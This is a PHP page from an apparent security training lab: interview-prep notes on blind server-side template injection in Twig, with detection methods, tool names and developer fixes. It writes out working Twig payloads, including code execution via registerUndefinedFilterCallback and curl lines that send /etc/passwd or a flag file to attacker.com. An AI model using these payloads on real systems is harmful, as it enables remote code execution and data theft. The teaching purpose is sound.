<?php
require_once __DIR__ . '/includes/helpers.php';
$page_title = 'S3 Interview Prep — Blind SSTI';
include __DIR__ . '/includes/header.php';
?>

<div class="page">
  <div class="interview-page">

    <div style="margin-bottom:24px;">
      <a href="/ssti_s3.php" style="font-size:0.82rem;color:var(--text-muted);">&larr; Back to Lab S3</a>
      &nbsp;&nbsp;
      <a href="/index.php" style="font-size:0.82rem;color:var(--text-muted);">Hub</a>
    </div>

    <div class="interview-section">
      <h1 style="font-size:1.4rem;margin-bottom:6px;">Lab S3 — Blind SSTI</h1>
      <p style="color:var(--text-muted);font-size:0.875rem;">Interview Prep · Out-of-Band Exfiltration</p>
    </div>

    <!-- 30-Second Explanation -->
    <div class="interview-section">
      <h2>30-Second Explanation</h2>
      <div class="thirty-sec">
        Blind SSTI is when template injection fires server-side but output is never returned to the attacker. Confirm via sleep-based timing or observable side effects, then exfiltrate data through an out-of-band channel: write to a readable path, trigger a DNS lookup, or make an HTTP callback to an attacker-controlled server.
      </div>
    </div>

    <!-- Common Interview Questions -->
    <div class="interview-section">
      <h2>Common Interview Questions</h2>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="s3q1">
        <label class="qa-question" for="s3q1">How do you confirm blind SSTI without output?</label>
        <div class="qa-answer">
          Three main techniques:
          <ol style="padding-left:1.2em;line-height:1.9;margin-top:8px;">
            <li><strong>Time-based</strong>: Inject a payload that causes measurable processing delay. In Twig: <code>{{range(1,100000)|join}}</code> forces the engine to generate a massive string — you'll see response latency increase if the engine is running.</li>
            <li><strong>Write to readable path</strong>: Use RCE to write output to a file you can read via another endpoint. In S3, the rendered output is stored to <code>/tmp/welcome_preview.txt</code> and readable via <code>?preview=1</code>.</li>
            <li><strong>DNS/HTTP OOB</strong>: Trigger an outbound request from the server to an attacker-controlled domain: <code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("curl http://attacker.com/?d=$(cat /etc/passwd|base64)")}}</code>. Monitor the DNS or HTTP server for the exfiltrated data.</li>
          </ol>
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="s3q2">
        <label class="qa-question" for="s3q2">How is blind SSTI methodology similar to blind SQL injection?</label>
        <div class="qa-answer">
          Both exploit the fact that server-side processing happens even when output is suppressed. The methodology is analogous:
          <ul style="padding-left:1.2em;line-height:1.9;margin-top:8px;">
            <li><strong>Blind SQLi</strong> uses boolean-based (true/false response differences) or time-based (SLEEP/WAITFOR DELAY) techniques, plus OOB (DNS via load_file/UTL_HTTP).</li>
            <li><strong>Blind SSTI</strong> uses time-based payloads (processing delays), secondary channel reads (write-to-readable-file), or OOB (curl/wget callbacks).</li>
          </ul>
          The key insight for both: the injection <em>fires</em> on the server even if the output is hidden. The goal is finding any observable side channel that leaks the result.
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="s3q3">
        <label class="qa-question" for="s3q3">What tools help automate blind SSTI detection?</label>
        <div class="qa-answer">
          <strong>tplmap</strong> is the de facto automated SSTI scanner (analogous to sqlmap for SQLi). It probes multiple engines, confirms blind injection via timing and OOB, and can exfiltrate data automatically. Burp Suite's <strong>Active Scanner</strong> includes SSTI detection. For manual hunting, the <strong>Burp Collaborator</strong> client provides a controlled OOB infrastructure to catch DNS/HTTP callbacks.
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="s3q4">
        <label class="qa-question" for="s3q4">What are common mistakes when exploiting blind SSTI?</label>
        <div class="qa-answer">
          <ul style="padding-left:1.2em;line-height:1.9;margin-top:8px;">
            <li>Using <code>exec()</code> for multi-line output — it only returns the last line. Use a file-writing payload or pipe to a collector for larger data.</li>
            <li>Not URL-encoding the payload when injecting via GET parameters — special characters like <code>{</code>, <code>}</code>, <code>"</code> may be stripped or misinterpreted.</li>
            <li>Assuming the injection didn't fire because there's no error — blind means no feedback in either direction. Confirm with timing before concluding the endpoint is safe.</li>
            <li>Forgetting that the rendered file persists across requests — subsequent users or admin panels may see your injected output.</li>
          </ul>
        </div>
      </div>
    </div>

    <!-- One-Liners -->
    <div class="interview-section">
      <h2>Blind SSTI Payloads</h2>
      <div style="display:flex;flex-direction:column;gap:8px;">
        <div>
          <div style="font-size:0.75rem;color:var(--text-dim);margin-bottom:3px;">Time-based confirmation (Twig)</div>
          <div class="oneliner">{{range(1,100000)|join}}</div>
        </div>
        <div>
          <div style="font-size:0.75rem;color:var(--text-dim);margin-bottom:3px;">Write flag to readable path via RCE</div>
          <div class="oneliner">{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flags/lab_s3.txt")}}</div>
        </div>
        <div>
          <div style="font-size:0.75rem;color:var(--text-dim);margin-bottom:3px;">OOB HTTP exfiltration</div>
          <div class="oneliner">{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("curl http://attacker.com/?x=$(cat /flags/lab_s3.txt)")}}</div>
        </div>
      </div>
    </div>

    <!-- Developer Fix -->
    <div class="interview-section">
      <h2>Developer Fix</h2>
      <div style="font-size:0.875rem;color:var(--text-muted);line-height:1.7;">
        <p style="margin-bottom:10px;">The root cause is identical to reflected SSTI — concatenating user input into template strings. The fix is the same: use static templates with safe variable passing. Additionally:</p>
        <ul style="padding-left:1.2em;line-height:1.9;">
          <li>Never write user-influenced data to files that are later served or read back — even indirectly.</li>
          <li>Treat "no output shown" as <em>not</em> a security control — assume injection fires and design accordingly.</li>
          <li>If storing rendered output is necessary, store it in a database (not a world-readable temp file) and access it only through authenticated, authorized endpoints.</li>
        </ul>
      </div>
    </div>

    <!-- Red Flags -->
    <div class="interview-section">
      <h2>Interview Red Flags</h2>
      <div style="display:flex;flex-direction:column;gap:8px;">
        <div class="red-flag-item">&#9888; Thinking "blind = safe" — lack of output does not mean the injection doesn't execute.</div>
        <div class="red-flag-item">&#9888; Not knowing any OOB exfiltration techniques for blind scenarios.</div>
        <div class="red-flag-item">&#9888; Overlooking secondary channels — secondary read endpoints, logs, error messages in other responses.</div>
        <div class="red-flag-item">&#9888; Giving up too early — blind vulnerabilities require persistence and creative side-channel thinking.</div>
      </div>
    </div>

    <div style="margin-top:24px;">
      <a href="/ssti_s3.php" class="btn btn-primary btn-sm">Go to Lab S3</a>
      &nbsp;
      <a href="/index.php" class="btn btn-ghost btn-sm">Hub</a>
    </div>

  </div>
</div>

<?php include __DIR__ . '/includes/footer.php'; ?>
